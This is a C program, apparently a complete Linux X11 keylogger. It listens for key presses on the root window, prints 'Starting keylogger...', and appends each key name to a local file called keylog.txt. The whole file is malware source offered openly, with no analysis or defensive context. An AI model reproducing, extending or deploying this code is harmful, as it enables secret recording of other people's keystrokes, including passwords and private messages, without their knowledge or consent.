#include <stdio.h>
#include <stdlib.h>
#include <X11/Xlib.h>
#include <X11/keysym.h>
#include <X11/Xutil.h>

int main() {
    Display *display;
    Window root;
    XEvent event;
    char keys[32];

    // Open the default display
    display = XOpenDisplay(NULL);
    if (display == NULL) {
        fprintf(stderr, "Unable to open X display\n");
        return -1;
    }

    // Get the root window for the current display
    root = DefaultRootWindow(display);

    // Set root window to listen for KeyPress events
    XSelectInput(display, root, KeyPressMask | KeyReleaseMask);

    printf("Starting keylogger...\n");

    while (1) {
        XNextEvent(display, &event);
        if (event.type == KeyPress) {
            KeySym key = XLookupKeysym(&event.xkey, 0);
            
            FILE *file = fopen("keylog.txt", "a");
            if (file == NULL) {
                fprintf(stderr, "Unable to open log file\n");
                break;
            }

            if (key == XK_Return) {
                fprintf(file, "\n");
            } else {
                fprintf(file, "%s ", XKeysymToString(key));
            }

            fclose(file);
        }
    }

    // Clean up
    XCloseDisplay(display);
    return 0;
}
